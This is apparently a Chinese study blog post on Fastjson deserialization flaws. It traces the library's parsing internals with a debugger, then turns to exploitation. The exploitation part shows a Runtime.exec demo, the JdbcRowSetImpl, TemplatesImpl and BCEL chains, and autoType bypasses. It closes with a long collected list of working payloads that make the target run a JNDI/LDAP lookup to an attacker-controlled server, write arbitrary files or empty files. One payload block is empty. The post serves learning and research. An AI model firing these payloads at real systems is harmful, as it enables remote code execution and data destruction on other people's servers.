# Fastjson

### What?

Fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean，Fastjson不但性能好而且API非常简单易用，所以用户基数巨大，一旦爆出漏洞其影响对于使用了Fastjson的Web应用来说是毁灭性的。

### 环境配置(fastjson<=1.2.24)

导入fastjson库

在pom.xml中加入

```xml
<dependencies>
    <dependency>
         <groupId>com.alibaba</groupId>
         <artifactId>fastjson</artifactId>
         <version>1.2.24</version>
     </dependency>
</dependencies>
```

### 先看看咋用

Person.java

```java
package org.example;

public class Person {
    private String name;
    private int age;
    public Person() {
        System.out.println("constructor");


    }

    public String getName() {
        System.out.println("getName");
        return name;
    }
    public void setName(String name) {
        System.out.println("setName");
        this.name = name;
    }
    public int getAge() {
        System.out.println("getAge");
        return age;
    }
    public void setAge(int age) {
        System.out.println("setAge");
        this.age = age;
    }
    @Override
    public String toString() {
        return "Person [name=" + name + ", age=" + age + "]";
    }
}

```

以这个Person类为例子

```JAVA
String s = "{\"name\":\"json\",\"age\":12}";
JSONObject jsonObject = JSONObject.parseObject(s);
System.out.println(jsonObject.toString());

'''
  {"name":"json","age":12}
```

这里将一个 JSON 格式的字符串转换为`JSONObject`对象，然后再将这个`JSONObject`对象以字符串形式输出。

```java
String s = "{\"name\":\"json\",\"age\":12}";
Person person  = JSONObject.parseObject(s, Person.class);
System.out.println(person.toString())
  
'''
  constructor
	setName
	setAge
	Person [name=json, age=12]
'''
```

- 当执行`JSONObject.parseObject(s, Person.class)`时，JSON 处理库会尝试将 JSON 字符串`s`中的数据填充到`Person`类的对象中。它会根据 JSON 中的键（如`"name"`和`"age"`）找到`Person`类中对应的成员变量，并设置相应的值。
- 然后，`System.out.println(person.toString())`会调用`Person`类重写的`toString()`方法，输出`Person`对象的信息。如果一切正常，输出结果应该类似于`Person{name='json', age=12}`。

- 同时根据输出的内容，我们可以得知fastjson通过调用setName和setAge来赋予给对象

#### fastjson的小特性

```java
String s = "{\"@type\":\"org.example.Person\",\"name\":\"json\",\"age\":12}";
JSONObject jsonObject  = JSONObject.parseObject(s);
System.out.println(jsonObject);

'''
  constructor
	setName
	setAge
	getAge
	getName
	{"name":"json","age":12}
'''
```

我们可以通过@type来指定一个类去解析后面的字符串，我们这里指定的是Person类。

根据回显我们可以知道fastjson对Person类进行了解析，实例化，调用等一系列操作

我们可以知道fastjson可以通过输入的字符串执行不同的代码的功能，有点像后门了...

直接开始debug吧

### 流程分析

#### 1.字符串解析

![image-20241108210527527](assets/202411082105614.png)

步入

![image-20241108211104705](assets/202411082111744.png)

我们可以先看看JSONObject是什么

![image-20241108211133822](assets/202411082111870.png)

我们可以看到它其实是一个Map，也就是键值对

回归正题 继续debug

从上面可以看出`parseObject`将我们传入的text传入了另一个`parse`

步入`parse`

![image-20241108211953221](assets/202411082119265.png)

我们可以看到字符被传入`DefaultJSONParser`这个字符解析器里面，后面这个`fearures`参数可以指定一些解析时的要求，比如能不能用单引号，能不能用空格之类的

步入这个prase

![image-20241108212230310](assets/202411082122347.png)

继续步入

![image-20241108213141654](assets/202411082131699.png)

我们可以看到这里运用switch-case结构对字符串进行挨个匹配

这里的`LBRACE`指的是左大括号，所以我们步入就直接跳转到`case LBRACE:`了

![image-20241108220148863](assets/202411082201908.png)

可以看到此时object还是空的，也就是说还没把我们传入的字符转化为一个对象

继续步入

![image-20241108220443612](assets/202411082204649.png)

在这个parseObject类里面，他会把我们传入的字符串转换为一个对象

直接步入到try-char部分，前面的东西不是很重要（看不懂）

![image-20241108220900531](assets/202411082209575.png)

这是一个死循环，也就是说只能通过break，return之类的才能跳出循环

这里会对字符串中的字符进行匹配，如

![image-20241108221443796](assets/202411082214831.png)

此时我们的第一位是'"'号，所以这里ch == '''的结果为false，而ch == '"'则结果为true

![image-20241108221858003](assets/202411082218051.png)

接下来会对key进行判断，我们这里的@type是属于第一类`DEFAULT_TYPE_KEY`

![](assets/202411082219150.png)

首先这里会用loadClass加载这个类`TypeUtils`，跟进去看看

![image-20241108222345267](assets/202411082223313.png)

这里会进行一些判断，比如传入的内容如果开头是'['则判定为数组

![image-20241108222516304](assets/202411082225352.png)

到最后就调用AppClassLoader来加载这个类，然后就返回`clazz`

以上就是对字符串进行解析的过程

#### 2.解析Java对象（反序列化？）

接下来我们继续步入

![image-20241108223313788](assets/202411082233838.png)

这里调用了一个Java反序列化器，步入

![image-20241108223704745](assets/202411082237805.png)

这个构造方法里面构造了很多个系统的内置的类一一对应的构造器

回到正题，继续步过，我们掉到一个方法里面

![image-20241108224321147](assets/202411082243198.png)

步入方法

![image-20241108224352904](assets/202411082243950.png)

有个获取注解的方法和一个黑名单方法（貌似用来限制性能？），没什么东西

回到ParserConfig,我们继续步入

![image-20241108224720955](assets/202411082247008.png)

这里进行了一堆类型的判断，如果符合类型则实例化对应的类，由于都不是，所以执行else语句中的内容，按照这个JavaBeanDeserializer来进行解析

步入JavaBeanDeserializer

![image-20241108225124464](assets/202411082251517.png)



> asmEnable是一个Java底层的动态创造代码的一个技术

这里asmEnable默认是true

不是很重要，快进一下

我们可以看到这里调用了一个叫JavaBeanInfo.build的函数，跟进去看看

![image-20241108230312518](assets/202411082303575.png)

这个类会在我们创建这个类对应的反序列化器的时候，要对我们的这个类里面的东西进行了解（我们这里是指constructor，setAge,setName之类的）

![image-20241108230716651](assets/202411082307707.png)

步进之后我们可以在这里面看到一个对我们的类里面的方法进行遍历的一个东西

![image-20241108231056159](assets/202411082310208.png)

直接看整体的代码逻辑

可以看到其实他对Method进行了两次的遍历，第一遍是为了获取所有的set（里面对开头是否为set进行了判断），而第二遍是为了获取所有的get

![image-20241108232406944](assets/202411082324989.png)

等获取了所有的set方法之后，他会创建一个FieldInfo

第二遍获取所有的get虽然判断方法有点不一样但是最后也是走到FieldInfo，但是有一个`判断限制如果前面已经提取过的方法这里不会再进行提取`。

这里省略了

对方法进行遍历结束之后,将我们获取到的方法传入这个`JavaBeanInfo`

![image-20241108235501832](assets/202411082355906.png)

里面没什么有用的东西，继续步进

![image-20241109110558219](assets/202411091105281.png)

![image-20241109110522868](assets/202411091105937.png)

可以看到在这里的`benInfo`已经获取到了字段name和age，同时也获取到了这个字段对应的方法，如name对应的setName方法

![image-20241109110752066](assets/202411091107106.png)

这里没有get方法是因为已经获取到了set方法，所有不会再获取get方法，上面遍历的时候有说，而且反序列化是一个赋值的过程，所有要调用的是set方法，用来赋值

继续步进

![image-20241109111339350](assets/202411091113429.png)

这里会进行一些判断，比如第一个这个判断fieldInfo的getOnly是否为true（这里是false），如果为true则使asmEnable为false，第二个会判断我们获取到的类是否为public类...

如果满足上面的全部条件，则无法打开开关`asmEnable`

那这个开关有什么用呢？

接着往下看

![image-20241109111930388](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411091119444.png)

我们可以看到假如这个开关没开的话，他就会创建一个`JavaBeanDeserializer`

而假如开关开了的话则会从信进行JavaBeanInfo.build

![image-20241109112355189](assets/202411091123243.png)

详细的就不重新看了

接着步进

![image-20241109112546567](assets/202411091125622.png)

这里会创建一个临时的JavaBeanDeserializer类，由于是一个临时的类导致我们很难继续调试（看不到源代码）

那我们可以回到刚才判断getonly是否为true的地方，我们如果可以想办法把getonly变成true则可以调用系统自带的反序列化器，方便我们进行调试

![image-20241109113123730](assets/202411091131788.png)

那我们查找一下，看一下getOnly的值在哪里写入

![image-20241109113351901](assets/202411091133948.png)

跟进去

![image-20241109113443184](assets/202411091134229.png)

我们可以看到如果获取一个长度不为1的方法就可以使getOnly的值为true，那我们要怎么做呢？

我们可以回去看看前面对set方法和get方法进行遍历的地方，我们可以发现在遍历获取set方法的时候，如果长度为一则会直接退出进行下一轮循环

![image-20241109114017424](assets/202411091140463.png)

所以想要让getOnly为true，set方法行不通。

但是如果一个属性已经有set方法则不会再获取get方法，那我们可以新建一个只有get方法的属性

```java
private Map map;
public Map getMap() {
    System.out.println("getMap");
    return map;
}
```

那我们继续调试，前面的都差不多，直接快进到getOnly赋值的地方，可以看到当遍历到map的时候，getOnly被赋值为true

那我们回到刚通过判断来选择不同的反序列化器的地方

![image-20241109115658398](assets/202411091156444.png)

由于map的getOnly是true，所以把开关关掉了

![image-20241109115751908](assets/202411091157957.png)

成功进入到这一步，我们可以继续进行调试了

这个JavaBeanDeServerializer里面其实就是进行一些赋值的操作（bzd）

接着步进

![image-20241109204408378](assets/202411092044463.png)

我看看现在的derializer

![image-20241109204457694](assets/202411092044742.png)

我们可以看到现在已经获取到三个对象

接下来就要调用反序列化方法了

![image-20241109204721865](assets/202411092047921.png)

我们前面所有工作就是为了拿到这个反序列化器

回想一下我们刚开始调用Person类的时候，会调用setName，getName等一系列方法，怎么实现的呢

在JavaBeanDeserializer里面，他会遍历刚刚我们获取到的三个字段

![image-20241109205340156](assets/202411092053206.png)

然后中间会进行一些实例化之类的操作（？）（不知道在干嘛

最后会调用setValue进行一些赋值操作

![image-20241109205739166](assets/202411092057215.png)

跟进去看看，可以看到在最后这里用了一个invoke方法给age进行了赋值

![image-20241109205943667](assets/202411092059712.png)

赋值完我们就可以看到控制台输出了setAge

![image-20241109210053277](assets/202411092100324.png)

接下来应该是对name进行赋值，与前面对age进行赋值的步骤一样，赋值后控制台输出setName

没有对map进行赋值（因为还没写到`String s`里面

那我们前面看到get方法是在哪被调用了呢（输出getName，getAge..）

![image-20241109211824788](assets/202411092118836.png)

其实是通过这个toJSON方法

在这个toJSON方法里面他会通过遍历获取所有的field（name，age，map）

![image-20241109212427373](assets/202411092124426.png)

获取完之后我们看看这个fieldInfoList，后面写着size=3，也就是已经获取到了三个字段（name，age，map）

![image-20241109212510240](assets/202411092125286.png)

![image-20241109212717609](assets/202411092127654.png)

值都获取到了，接下来该进行调用了，当我们步进到这里时

![image-20241109212846928](assets/202411092128982.png)

这里调用了一个getFieldValuesMap方法，进去看看

![image-20241109213351039](assets/202411092133087.png)

我们可以发现这个循环会调用get方法，那我们进去看看这个getPropertyValue方法，看看他怎么调用的

![image-20241109213714655](assets/202411092137709.png)

可以发现在这一行之后会输出getAge，那我们再步入

![image-20241109213806538](assets/202411092138586.png)

可以看到这里调用了invoke方法，执行后输出getAge，那我们就知道为什么会调用get方法了，接下来的map和name的get方法调用也是一样的，就不叙述了

🆗到这里整个Fastjson的流程分析就结束了

#### 3.流程总结

回归刚刚我们写的代码

![image-20241109214319202](assets/202411092143248.png)

我们可以知道当使用`@type:`的时候fastjson在对他进行反序列化解析的时候会构造对应的方法，所以我们可以看到输出constructor

而后续在给age和name赋值的时候会调用对应的set方法，所以输出setName，setAge

最后之所以会调用这个get方法主要是因为后面调用的parseObject方法会对getName，getAge，getMap进行调用

> 假如不使用parseObject方法，但是在String s中加入\"map\"也会进行get方法的调用

### 漏洞利用

#### 简单利用demo

JSONUser.Java

```Java
package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
public class JSONUser {
    public static void main(String[] args) {
        String s = "{\"@type\":\"org.example.Test\",\"cmd\":\"calc\"}";
        JSONObject jsonObject = JSON.parseObject(s);
        System.out.println(jsonObject);
        }
}
```

Test.Java

```java
package org.example;

import java.io.IOException;

public class Test {
    public static void setcmd(String cmd) throws IOException {
        Runtime.getRuntime().exec(cmd);

    }
}
```

这样就能成功打开计算机了，虽然Test类里面没有定义cmd这个变量，但是fastjson依旧会对他进行解析并调用

#### **JdbcRowSetImpl 反序列化**(<=1.2.24)：

攻击流程：

1. 首先是这个lookup(URI)参数可控
2. 攻击者控制URI参数为指定为恶意的一个RMI服务
3. 攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；
4. 目标在进行`lookup()`操作时，会动态加载并实例化Factory类，接着调用`factory.getObjectInstance()`获取外部远程对象实例；
5. 攻击者可以在Factory类文件的静态代码块处写入恶意代码，达到RCE的效果；

payload：

```java
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:23457/Command8","autoCommit":true}
```



#### **TemplatesImpl 反序列化(<=1.2.24)[实战意义不大？]：**

流程分析：

首先TemplatesImpl类位于`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`

![image-20241111205337699](assets/image-20241111205337699.png)

在这个TemplatesImpl类中的`getTransletInstance()`方法会对`_class[_transletIndex]`进行实例化

而这个\_class是一个Class类的数组，而\_transletIndex则是这个数组的一个下标

![image-20241111205703021](assets/image-20241111205703021.png)

而且在TemplatesImpl类中的 `getOutputProperties()` 方法调用 `newTransformer()` 方法，而 `newTransformer()` 又调用了 `getTransletInstance()` 方法。

![image-20241111210518000](assets/image-20241111210518000.png)

![image-20241111210550906](assets/image-20241111210550906.png)

那也就说假如`getOutputProperties()`是类里面某一个成员的getter方法，且`_class`可控那我就可以通过fastjson的特性从而达到调用任意类的目的

我们可以发现`getOutputProperties()`是_outputProperties的getter方法

接下来我们查看一下_class的用法

![image-20241111211337694](assets/image-20241111211337694.png)

我们可以发现这三个方法都可以对_class进行赋值操作

回想刚刚我们一开始看的getTransletInstance()方法，我们会发现当_class为空的时候会调用defineTransletClasses()方法

![image-20241111212950200](assets/image-20241111212950200.png)

那我们看看defineTransletClasses()是怎么给_class赋值的

![image-20241111213713629](assets/image-20241111213713629.png)

> 首先要求 `_bytecodes` 不为空，接着就会调用自定义的 ClassLoader 去加载 `_bytecodes` 中的 `byte[]` 。而 `_bytecodes` 也是该类的成员属性。
>
> 而如果这个类的父类为 `ABSTRACT_TRANSLET` 也就是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，就会将类成员属性的，`_transletIndex` 设置为当前循环中的标记位，而如果是第一次调用，就是`_class[0]`。如果父类不是这个类，将会抛出异常。

**有点不懂先引用一下**

那这样一条完整的漏洞调用链就呈现出来了：

- 构造一个 TemplatesImpl 类的反序列化字符串，其中 `_bytecodes` 是我们构造的恶意类的类字节码，这个类的父类是 AbstractTranslet，最终这个类会被加载并使用 `newInstance()` 实例化。
- 在反序列化过程中，由于getter方法 `getOutputProperties()`，满足条件，将会被 fastjson 调用，而这个方法触发了整个漏洞利用流程：`getOutputProperties()` -> `newTransformer()` -> `getTransletInstance()` -> `defineTransletClasses()` / `EvilClass.newInstance()`.

其中，为了满足漏洞点触发之前不报异常及退出，我们还需要满足 `_name` 不为 null ，`_tfactory` 不为 null 。

由于部分需要我们更改的私有变量没有 setter 方法，需要使用 `Feature.SupportNonPublicField` 参数。

> 在反序列化 JSON 字符串为 Java 对象时，启用`Feature.SupportNonPublicField`参数可以让库将 JSON 数据填充到 Java 对象的非公共字段中。

payload:

```java
{
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["yv66vgAAADQA...CJAAk="],
    "_name": "su18",
    "_tfactory": {},
    "_outputProperties": {},
}
```

#### Fastjson BCEL (<=1.2.24)

bcel简单分析：

环境配置

```xml
<dependency>
      <groupId>commons-dbcp</groupId>
      <artifactId>commons-dbcp</artifactId>
      <version>1.4</version>
</dependency>
```

我们先从`org.apache.commons.dbcp.BasicDataSource`开始分析

![image-20241112184924629](assets/image-20241112184924629.png)

在这个类里面假如这个diverClassLoad和diverClassName不为空则会用这个Classload加载这个diverClassName类

![image-20241112185117502](assets/image-20241112185117502.png)

![image-20241112185144616](assets/image-20241112185144616.png)

而这两个量都有对应的setter方法，也就是说我们可以利用fastjson调用setter赋值的特性来给这两个量赋值从而实现任意类的调用

那我们再看看这个createConnectionFactory()是否可控

![image-20241112190545326](assets/image-20241112190545326.png)

![image-20241112190525158](assets/image-20241112190525158.png)

通过两部我们可以看到这个getConnection()方法可以调用到createConnectionFactory()

那我们可以尝试一下

payload:

```

```



#### ParserConfig (1.2.25 <= fastjson <= 1.2.41):

payload:

```java
{
    "@type":"Lcom.sun.rowset.JdbcRowSetImpl;",
    "dataSourceName":"ldap://127.0.0.1:23457/Command8",
    "autoCommit":true
}
```



#### ParserConfig2 (fastjson-1.2.42)



payload:

```java
{
    "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
    "dataSourceName":"ldap://127.0.0.1:23457/Command8",
    "autoCommit":true
}
```



#### JndiDataSourceFactory(1.2.25 <= fastjson <= 1.2.32)

payload:

```java
{
    "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties":{
        "data_source":"ldap://127.0.0.1:23457/Command8"
    }
}
```



#### 未开启 AutoTypeSupport(1.2.25 <= fastjson <= 1.2.32)：

```java
{
    "su18": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "su19": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://127.0.0.1:23457/Command8",
        "autoCommit": true
    }
}
```



### payload合集

https://www.javasec.org/java-vuls/FastJson.html#%E5%9B%9B%E3%80%81payload

以下为部分在各个途径搜集的 payload，版本自测：

JdbcRowSetImpl

```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://127.0.0.1:23457/Command8",
    "autoCommit": true
}
```

TemplatesImpl

```json
{
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["yv66vgA...k="],
    '_name': 'su18',
    '_tfactory': {},
    "_outputProperties": {},
}
```

JndiDataSourceFactory

```json
{
    "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties": {
      "data_source": "ldap://127.0.0.1:23457/Command8"
    }
}
```

SimpleJndiBeanFactory

```json
{
    "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
    "targetBeanName": "ldap://127.0.0.1:23457/Command8",
    "propertyPath": "su18",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "ldap://127.0.0.1:23457/Command8"
      ]
    }
}
```

DefaultBeanFactoryPointcutAdvisor

```json
{
  "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
   "beanFactory": {
     "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
     "shareableResources": [
       "ldap://127.0.0.1:23457/Command8"
     ]
   },
   "adviceBeanName": "ldap://127.0.0.1:23457/Command8"
},
{
   "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"
}
```

WrapperConnectionPoolDataSource

```json
{
    "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
    "userOverridesAsString": "HexAsciiSerializedMap:aced000...6f;"
  }
```

JndiRefForwardingDataSource

```json
{
    "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
    "jndiName": "ldap://127.0.0.1:23457/Command8",
    "loginTimeout": 0
  }
```

InetAddress

```json
{
    "@type": "java.net.InetAddress",
    "val": "http://dnslog.com"
}
```

Inet6Address

```json
{
    "@type": "java.net.Inet6Address",
    "val": "http://dnslog.com"
}
```

URL

```json
{
    "@type": "java.net.URL",
    "val": "http://dnslog.com"
}
```

JSONObject

```json
{
    "@type": "com.alibaba.fastjson.JSONObject",
    {
        "@type": "java.net.URL",
        "val": "http://dnslog.com"
    }
}
""
}
```

URLReader

```json
{
    "poc": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.alibaba.fastjson.JSONReader",
        "reader": {
            "@type": "jdk.nashorn.api.scripting.URLReader",
            "url": "http://127.0.0.1:9999"
        }
    }
}
```

AutoCloseable 任意文件写入

```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream",
    "out": {
        "@type": "java.io.FileOutputStream",
        "file": "/path/to/target"
    },
    "parameters": {
        "@type": "org.apache.commons.compress.compressors.gzip.GzipParameters",
        "filename": "filecontent"
    }
}
```

BasicDataSource

```json
{
  "@type" : "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
  "driverClassName" : "$$BCEL$$$l$8b$I$A$A$A$A...",
  "driverClassLoader" :
  {
    "@type":"Lcom.sun.org.apache.bcel.internal.util.ClassLoader;"
  }
}
```

JndiConverter

```json
{
    "@type": "org.apache.xbean.propertyeditor.JndiConverter",
    "AsText": "ldap://127.0.0.1:23457/Command8"
}
```

JtaTransactionConfig

```json
{
    "@type": "com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
    "properties": {
        "@type": "java.util.Properties",
        "UserTransaction": "ldap://127.0.0.1:23457/Command8"
    }
}
```

JndiObjectFactory

```json
{
    "@type": "org.apache.shiro.jndi.JndiObjectFactory",
    "resourceName": "ldap://127.0.0.1:23457/Command8"
}
```

AnterosDBCPConfig

```json
{
    "@type": "br.com.anteros.dbcp.AnterosDBCPConfig",
    "metricRegistry": "ldap://127.0.0.1:23457/Command8"
}
```

AnterosDBCPConfig2

```json
{
    "@type": "br.com.anteros.dbcp.AnterosDBCPConfig",
    "healthCheckRegistry": "ldap://127.0.0.1:23457/Command8"
}
```

CacheJndiTmLookup

```json
{
    "@type": "org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
    "jndiNames": "ldap://127.0.0.1:23457/Command8"
}
```

AutoCloseable 清空指定文件

```json
{
    "@type":"java.lang.AutoCloseable",
    "@type":"java.io.FileOutputStream",
    "file":"/tmp/nonexist",
    "append":false
}
```

AutoCloseable 清空指定文件

```json
{
    "@type":"java.lang.AutoCloseable",
    "@type":"java.io.FileWriter",
    "file":"/tmp/nonexist",
    "append":false
}
```

AutoCloseable 任意文件写入

```json
{
    "stream":
    {
        "@type":"java.lang.AutoCloseable",
        "@type":"java.io.FileOutputStream",
        "file":"/tmp/nonexist",
        "append":false
    },
    "writer":
    {
        "@type":"java.lang.AutoCloseable",
        "@type":"org.apache.solr.common.util.FastOutputStream",
        "tempBuffer":"SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=",
        "sink":
        {
            "$ref":"$.stream"
        },
        "start":38
    },
    "close":
    {
        "@type":"java.lang.AutoCloseable",
        "@type":"org.iq80.snappy.SnappyOutputStream",
        "out":
        {
            "$ref":"$.writer"
        }
    }
}
```

BasicDataSource

```json
{
        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
        "driverClassName": "true",
        "driverClassLoader": {
            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A"
    }
```

HikariConfig

```json
{
    "@type": "com.zaxxer.hikari.HikariConfig",
    "metricRegistry": "ldap://127.0.0.1:23457/Command8"
}
```

HikariConfig

```json
{
    "@type": "com.zaxxer.hikari.HikariConfig",
    "healthCheckRegistry": "ldap://127.0.0.1:23457/Command8"
}
```

HikariConfig

```json
{
    "@type": "org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig",
    "metricRegistry": "ldap://127.0.0.1:23457/Command8"
}
```

HikariConfig

```json
{
    "@type": "org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig",
    "healthCheckRegistry": "ldap://127.0.0.1:23457/Command8"
}
```

SessionBeanProvider

```json
{
    "@type": "org.apache.commons.proxy.provider.remoting.SessionBeanProvider",
    "jndiName": "ldap://127.0.0.1:23457/Command8",
    "Object": "su18"
}
```

JMSContentInterceptor

```json
{
    "@type": "org.apache.cocoon.components.slide.impl.JMSContentInterceptor",
    "parameters": {
        "@type": "java.util.Hashtable",
        "java.naming.factory.initial": "com.sun.jndi.rmi.registry.RegistryContextFactory",
        "topic-factory": "ldap://127.0.0.1:23457/Command8"
    },
    "namespace": ""
}
```

ContextClassLoaderSwitcher

```json
{
    "@type": "org.jboss.util.loading.ContextClassLoaderSwitcher",
    "contextClassLoader": {
        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
    },
    "a": {
        "@type": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A"
    }
}
```

OracleManagedConnectionFactory

```json
{
    "@type": "oracle.jdbc.connector.OracleManagedConnectionFactory",
    "xaDataSourceName": "ldap://127.0.0.1:23457/Command8"
}
```

JNDIConfiguration

```json
{
    "@type": "org.apache.commons.configuration.JNDIConfiguration",
    "prefix": "ldap://127.0.0.1:23457/Command8"
}
```